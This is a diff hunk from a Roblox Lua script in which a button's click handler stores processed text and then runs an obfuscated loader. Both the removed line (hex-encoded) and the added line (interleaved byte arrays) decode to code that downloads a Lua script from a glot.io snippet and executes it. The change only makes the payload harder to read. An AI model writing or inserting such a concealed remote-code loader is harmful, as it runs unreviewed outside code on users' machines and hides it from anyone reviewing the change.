@@ -97,7 +97,7 @@ button.MouseButton1Click:Connect(function()
     if textBox.Text ~= "" then
         local processedText = processSpecialChars(textBox.Text)
         _G.text = processedText
-        loadstring((function() local e="6c6f6164737472696e672867616d653a48747470476574282268747470733a2f2f676c6f742e696f2f736e6970706574732f6838736d76726f7a39662f7261772f636f6e7379732e6c75612229292829" local d="" for i=1,#e,2 do d=d..string.char(tonumber(e:sub(i,i+1),16))end return d end)())()
+        loadstring((function(a,b)local s=''for i=1,math.max(#a,#b)do if a[i]then s=s..string.char(a[i])end if b[i]then s=s..string.char(b[i])end end return s end)({108,97,115,114,110,40,97,101,72,116,71,116,34,116,112,58,47,108,116,105,47,110,112,101,115,104,115,118,111,57,47,97,47,111,115,115,108,97,41,40},{111,100,116,105,103,103,109,58,116,112,101,40,104,116,115,47,103,111,46,111,115,105,112,116,47,56,109,114,122,102,114,119,99,110,121,46,117,34,41,41}))()
     end
 end)
 
